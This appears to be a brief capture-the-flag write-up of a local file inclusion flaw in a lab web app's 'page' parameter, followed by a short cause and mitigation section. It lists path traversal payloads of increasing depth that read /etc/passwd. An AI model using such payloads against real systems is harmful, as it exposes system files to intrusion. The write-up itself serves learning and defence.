# Local File Inclusion

The `page` parameter is vulnerable to file path traversal:

`http://172.18.254.134/?page=`

By increasing `../` depth, we reached `/etc/passwd`:

- `?page=../etc/passwd`
- `?page=../../../etc/passwd`
- `?page=../../../../../../etc/passwd`
- `?page=../../../../../../../../../etc/passwd`

The final payload successfully triggered the challenge logic and returned the flag.

## Vulnerability
The app used user input as a file path and allowed `../` path traversal.

## Mitigation
Allow only known page names and block `../` in paths.

